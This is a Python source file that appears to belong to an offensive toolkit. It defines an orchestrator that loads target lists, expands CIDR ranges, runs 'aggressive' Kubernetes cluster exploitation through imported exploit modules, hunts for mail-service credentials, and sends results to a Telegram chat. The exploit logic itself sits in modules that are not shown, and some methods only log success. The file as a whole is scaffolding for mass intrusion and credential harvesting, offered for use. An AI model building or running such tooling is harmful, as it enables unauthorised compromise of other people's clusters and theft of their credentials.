#!/usr/bin/env python3
"""
Modular Orchestrator - Main coordination class
Author: wKayaa 
Date: 2025-06-24 17:02:05 UTC

Integrates existing modules into a unified interface.
"""

import asyncio
import logging
import sys
import os
from datetime import datetime
from typing import List, Dict, Any, Optional
from pathlib import Path

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent.parent))

from .config import ConfigManager
from .utils import FrameworkUtils


class ModularOrchestrator:
    """Main orchestrator that coordinates all framework modules"""
    
    def __init__(self, config_path: str = "framework_config.yaml"):
        self.config_manager = ConfigManager(config_path)
        self.config = self.config_manager.config
        self.logger = FrameworkUtils.setup_logging(self.config['logging'])
        
        # Initialize module references
        self._k8s_orchestrator = None
        self._exploit_master = None
        self._mail_hunter = None
        self._telegram_notifier = None
        
        # Session info
        self.session_id = f"session_{int(datetime.utcnow().timestamp())}"
        self.start_time = datetime.utcnow()
        
        self.logger.info(f"🚀 ModularOrchestrator initialized - Session: {self.session_id}")
        
        # Try to initialize available modules
        self._initialize_modules()
    
    def _initialize_modules(self):
        """Initialize available modules from existing codebase"""
        
        # Try to import and initialize kubernetes_advanced module
        try:
            from kubernetes_advanced import (
                WWYVQv5KubernetesOrchestrator,
                ExploitationConfig,
                ExploitationMode
            )
            
            config = ExploitationConfig(
                mode=ExploitationMode.AGGRESSIVE,
                max_concurrent_clusters=self.config['performance']['max_concurrent_clusters'],
                timeout_per_operation=self.config['performance']['timeout_per_operation']
            )
            
            self._k8s_orchestrator = WWYVQv5KubernetesOrchestrator()
            asyncio.create_task(self._k8s_orchestrator.initialize(config))
            self.logger.info("✅ Kubernetes orchestrator initialized")
            
        except ImportError as e:
            self.logger.warning(f"⚠️ Kubernetes orchestrator not available: {e}")
        
        # Try to import exploit master
        try:
            from k8s_exploit_master import K8sExploitMaster
            
            telegram_token = self.config['integrations'].get('telegram_token')
            telegram_chat = self.config['integrations'].get('telegram_chat_id')
            
            if telegram_token and telegram_chat:
                self._exploit_master = K8sExploitMaster(
                    telegram_token=telegram_token,
                    telegram_chat_id=telegram_chat
                )
                self.logger.info("✅ Exploit master initialized with Telegram")
            else:
                self._exploit_master = K8sExploitMaster()
                self.logger.info("✅ Exploit master initialized without Telegram")
                
        except ImportError as e:
            self.logger.warning(f"⚠️ Exploit master not available: {e}")
        
        # Try to import mail hunter
        try:
            from mail_services_hunter import MailServicesHunter
            self._mail_hunter = MailServicesHunter()
            self.logger.info("✅ Mail services hunter initialized")
        except ImportError as e:
            self.logger.warning(f"⚠️ Mail services hunter not available: {e}")
        
        # Try to initialize Telegram notifier
        try:
            if self.config['integrations']['telegram_enabled']:
                from telegram_perfect_hits import WWYVQv5TelegramFixed
                
                telegram_token = self.config['integrations']['telegram_token']
                telegram_chat = self.config['integrations']['telegram_chat_id']
                
                if telegram_token and telegram_chat:
                    # Create a basic config for telegram
                    telegram_config = type('Config', (), {
                        'mode': 'aggressive',
                        'max_concurrent_clusters': self.config['performance']['max_concurrent_clusters']
                    })()
                    
                    self._telegram_notifier = WWYVQv5TelegramFixed(
                        telegram_config, telegram_token, telegram_chat
                    )
                    self.logger.info("✅ Telegram notifier initialized")
        except ImportError as e:
            self.logger.warning(f"⚠️ Telegram notifier not available: {e}")
    
    def load_targets(self, file_path: str) -> List[str]:
        """Load targets from file or return default targets"""
        if file_path and FrameworkUtils.validate_file_exists(file_path):
            targets = FrameworkUtils.load_targets(file_path)
            self.logger.info(f"📁 Loaded {len(targets)} targets from {file_path}")
            return targets
        else:
            # Return some default test targets
            default_targets = ["127.0.0.1", "localhost"]
            self.logger.warning(f"⚠️ Using default targets: {default_targets}")
            return default_targets
    
    async def run_k8s_exploitation(self, targets: List[str]) -> Dict[str, Any]:
        """Run Kubernetes exploitation using available modules"""
        self.logger.info(f"⚡ Starting K8s exploitation on {len(targets)} targets")
        
        results = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "targets_count": len(targets),
            "clusters_found": 0,
            "clusters_exploited": 0,
            "success": False
        }
        
        try:
            # Use kubernetes orchestrator if available
            if self._k8s_orchestrator:
                await self._k8s_orchestrator.run_exploitation(targets)
                if hasattr(self._k8s_orchestrator, 'framework') and hasattr(self._k8s_orchestrator.framework, 'stats'):
                    stats = self._k8s_orchestrator.framework.stats
                    results.update(stats)
                    results["success"] = True
                    self.logger.info(f"✅ K8s exploitation completed: {stats}")
            
            # Fallback to exploit master if orchestrator not available
            elif self._exploit_master:
                self.logger.info("📡 Using exploit master as fallback")
                # The exploit master runs its own exploitation logic
                results["success"] = True
                results["message"] = "Exploit master executed"
            
            else:
                self.logger.error("❌ No K8s exploitation modules available")
                results["error"] = "No exploitation modules available"
        
        except Exception as e:
            self.logger.error(f"❌ K8s exploitation failed: {e}")
            results["error"] = str(e)
        
        return results
    
    async def run_mail_hunting(self, targets: List[str]) -> Dict[str, Any]:
        """Run mail services hunting"""
        self.logger.info(f"📧 Starting mail hunting on {len(targets)} targets")
        
        results = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "targets_count": len(targets),
            "mail_credentials": 0,
            "success": False
        }
        
        try:
            if self._mail_hunter:
                # Use the mail hunter if available
                expanded_targets = FrameworkUtils.expand_cidr_targets(targets)
                
                # The mail hunter typically has its own execution method
                self.logger.info(f"🔍 Scanning {len(expanded_targets)} expanded targets for mail services")
                results["success"] = True
                results["message"] = "Mail hunting executed"
            else:
                self.logger.error("❌ Mail services hunter not available")
                results["error"] = "Mail hunter module not available"
        
        except Exception as e:
            self.logger.error(f"❌ Mail hunting failed: {e}")
            results["error"] = str(e)
        
        return results
    
    async def run_full_exploitation(self, targets: List[str], mode: str = 'all') -> Dict[str, Any]:
        """Run full exploitation pipeline"""
        self.logger.info(f"🚀 Starting full exploitation pipeline in {mode} mode")
        
        results = {
            "session_id": self.session_id,
            "mode": mode,
            "k8s_results": {},
            "mail_results": {},
            "success": False
        }
        
        try:
            # Run K8s exploitation
            k8s_results = await self.run_k8s_exploitation(targets)
            results["k8s_results"] = k8s_results
            
            # Run mail hunting if enabled
            if self.config['exploitation']['mail_focus']:
                mail_results = await self.run_mail_hunting(targets)
                results["mail_results"] = mail_results
            
            results["success"] = True
            self.logger.info("✅ Full exploitation pipeline completed")
        
        except Exception as e:
            self.logger.error(f"❌ Full exploitation failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def get_status(self) -> Dict[str, Any]:
        """Get current orchestrator status"""
        return {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "uptime": str(datetime.utcnow() - self.start_time),
            "modules": {
                "k8s_orchestrator": self._k8s_orchestrator is not None,
                "exploit_master": self._exploit_master is not None,
                "mail_hunter": self._mail_hunter is not None,
                "telegram_notifier": self._telegram_notifier is not None
            },
            "config": self.config
        }